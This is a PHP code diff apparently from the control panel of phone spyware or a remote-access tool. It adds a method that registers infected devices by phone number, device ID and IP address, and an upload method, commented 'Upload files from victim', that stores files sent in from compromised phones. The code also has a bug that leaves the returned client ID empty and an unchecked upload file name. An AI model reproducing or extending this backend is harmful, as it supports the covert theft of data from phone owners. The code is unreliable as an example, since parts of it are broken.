@@ -166,6 +166,69 @@ class ControlPanel extends Base
     }
 
     /**
+     * Register a client
+     * 
+     * @return string
+     */
+    public function createClient(): string
+    {
+        if (!isset($_POST['phone']))
+            return;
+
+        if (!isset($_POST['device_api']))
+            return;
+
+        if (!isset($_POST['device_id']))
+            return;
+
+        if (!isset($_POST['device_model']))
+            return;
+
+        if (!isset($_POST['ip_address']))
+            return;
+
+        $query = "INSERT INTO CLIENT(model, device_id, ip_address, device_api, phone) VALUES(?, ?, ?, ?, ?)";
+        $data = [
+            $_POST['device_model'],
+            $_POST['device_id'],
+            $_POST['ip_address'],
+            $_POST['device_api'],
+            $_POST['phone']
+        ];
+        $this->database->insert($query, $data);
+
+        $query = "SELECT * FROM CLIENT WHERE model=? AND device_id=? AND phone=?";
+        $data = [
+            $_POST['device_model'],
+            $_POST['device_id'],
+            $_POST['phone']
+        ];
+        $rows = $this->database->select($query, $data);
+        $response = [];
+        foreach ($response as $data) {
+            $response['client_id'] = $data['id'];
+            break;
+        }
+
+        return json_encode($response);
+    }
+
+    /**
+     * Upload files from victim
+     */
+    public function upload(string $type): void
+    {
+        $destination = __DIR__ . "/../../../files/" . $type . "/";
+
+        if(isset($_FILES['file'])) {
+            $file_name = $_FILES['file']['name'];
+            $file_tmp = $_FILES['file']['tmp_name'];
+            
+            move_uploaded_file($file_tmp, $destination . $file_name);
+        }
+    }
+
+    /**
      * Get victims
      * 
      * @return array<Client>
